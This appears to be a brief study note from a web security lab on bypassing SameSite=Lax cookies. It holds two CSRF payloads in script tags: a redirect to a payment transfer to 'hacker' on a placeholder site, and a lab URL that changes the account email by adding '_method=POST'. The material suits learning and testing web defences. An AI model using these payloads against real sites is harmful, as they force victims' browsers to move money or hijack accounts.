# Bypass Same-site Lax using method switch

Bypass:

```jsx
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

**SameSite Lax bypass via method override**

![image.png](Bypass%20Same-site%20Lax%20using%20method%20switch/image.png)

```jsx
<script>
    document.location = "https://0a7000c603bc1e9d8003211300090014.web-security-academy.net/my-account/change-email?email=pwner@web-security-academy.netrunner&_method=POST";
</script>
```